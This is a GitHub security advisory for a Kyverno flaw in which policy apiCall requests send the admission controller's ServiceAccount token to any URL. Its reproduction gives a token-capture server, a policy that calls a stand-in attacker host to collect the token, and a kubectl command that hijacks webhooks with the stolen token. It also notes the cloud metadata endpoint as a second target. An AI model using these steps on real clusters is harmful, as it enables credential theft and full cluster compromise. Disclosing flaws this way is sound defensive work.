# [H] Kyverno: ServiceAccount token leaked to external servers via apiCall service URL

## Summary
Severity: High
Advisory: GHSA-f9g8-6ppc-pqq4
CVE: CVE-2026-41323
CWE: CWE-200, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-f9g8-6ppc-pqq4
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0 <1.17.0

## Details
## Summary

Kyverno's apiCall feature in ClusterPolicy automatically attaches the admission controller's ServiceAccount token to outgoing HTTP requests. The service URL has no validation — it can point anywhere, including attacker-controlled servers. Since the admission controller SA has permissions to patch webhook configurations, a stolen token leads to full cluster compromise.

## Affected version

Tested on Kyverno v1.17.1 (Helm chart default installation). Likely affects all versions with apiCall service support.

## Details

There are two issues that combine into one attack chain.

The first is in `pkg/engine/apicall/executor.go` around line 138. The service URL from the policy spec goes straight into `http.NewRequestWithContext()`:

```go
req, err := http.NewRequestWithContext(ctx, string(apiCall.Method), apiCall.Service.URL, data)
```

No scheme check, no IP restriction, no allowlist. The policy validation webhook (`pkg/validation/policy/validate.go`) only looks at JMESPath syntax.

The second is at lines 155-159 of the same file. If the request doesn't already have an Authorization header, Kyverno reads its own SA token and injects it:

```go
if req.Header.Get("Authorization") == "" {
    token := a.getToken()
    req.Header.Add("Authorization", "Bearer "+token)
}
```

The token is the admission controller's long-lived SA token from `/var/run/secrets/kubernetes.io/serviceaccount/token`. With the default Helm install, this SA (`kyverno-admission-controller`) can read and PATCH both `MutatingWebhookConfiguration` and `ValidatingWebhookConfiguration`.

## Reproduction

**Environment**: Kyverno v1.17.1, K3s v1.34.5, single-node cluster, default Helm install

**Step 1**: Start an HTTP listener on an attacker machine:

```python
# capture_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(json.dumps({
            "timestamp": str(datetime.datetime.now()),
            "path": self.path,
            "headers": dict(self.headers)
        }, indent=2))
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"ok": true}')

HTTPServer(("0.0.0.0", 9999), Handler).serve_forever()
```

**Step 2**: Create a ClusterPolicy that calls the attacker server:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: ssrf-poc
spec:
  validationFailureAction: Audit
  background: false
  rules:
  - name: exfil
    match:
      any:
      - resources:
          kinds:
          - Pod
    context:
    - name: exfil
      apiCall:
        service:
          url: "http://ATTACKER-IP:9999/steal"
        method: GET
        jmesPath: "@"
    validate:
      message: "check"
      deny:
        conditions:
          any:
          - key: "{{ exfil }}"
            operator: Equals
            value: "NEVER_MATCHES"
```

**Step 3**: Create any pod to trigger policy evaluation:

```bash
kubectl run test --image=nginx
```

**Step 4**: The listener receives the SA token immediately:

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

Decoded JWT `sub` claim: `system:serviceaccount:kyverno:kyverno-admission-controller`

Every subsequent pod creation sends the token again. No race condition, no timing — it fires every time.

**Step 5**: Use the token to hijack webhooks:

```bash
# Verify permissions
kubectl auth can-i patch mutatingwebhookconfigurations \
  --as=system:serviceaccount:kyverno:kyverno-admission-controller
# yes

# Patch the webhook to redirect to attacker
kubectl patch mutatingwebhookconfiguration kyverno-policy-mutating-webhook-cfg \
  --type='json' \
  -p='[{"op":"replace","path":"/webhooks/0/clientConfig/url","value":"https://ATTACKER:443/mutate"}]' \
  --token="eyJhbG..."
```

After this, every K8s API request that triggers the webhook goes to the attacker's server. The attacker can mutate any pod spec — inject containers, mount host paths, add privileged security contexts.

## Verified permissions of stolen token

Tested with the default Helm installation:

| Action | Result |
|--------|--------|
| List pods (all namespaces) | Allowed |
| Read configmaps in kube-system | Allowed |
| PATCH MutatingWebhookConfiguration | **Allowed** |
| PATCH ValidatingWebhookConfiguration | **Allowed** |
| Read secrets (cluster-wide) | Denied (per-NS only) |

## Impact

An attacker who can create ClusterPolicy resources (or who compromises a service account with that permission) can steal Kyverno's admission controller token and use it to:

1. Hijack Kyverno's own mutating/validating webhooks
2. Intercept and modify every API request flowing through the cluster
3. Inject malicious containers, escalate privileges, exfiltrate secrets

The token is also sent to internal endpoints — `http://169.254.169.254/latest/meta-data/` works, so on cloud-hosted clusters (EKS, GKE, AKS) this also leaks cloud IAM credentials.

RBAC note: ClusterPolicy is a cluster-scoped resource, so creating one requires cluster-level RBAC. But in practice, platform teams often grant policy-write to team leads or automation pipelines. The auto-injection of the SA token is the unexpected part — nobody expects writing a policy to leak the controller's credentials.

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-f9g8-6ppc-pqq4
- https://nvd.nist.gov/vuln/detail/CVE-2026-41323
- https://github.com/kyverno/kyverno/commit/bc4f91c4801b1eaa2edc0a14e2f1b0af8cf0c1f5
- https://github.com/kyverno/kyverno/commit/c2eab00033e635bda4e4efb58c1b472b41728bb6
- https://github.com/kyverno/kyverno/commit/f70e8ac1e7acd2e3844f9553e4a884f07f953de0
- https://github.com/kyverno/kyverno
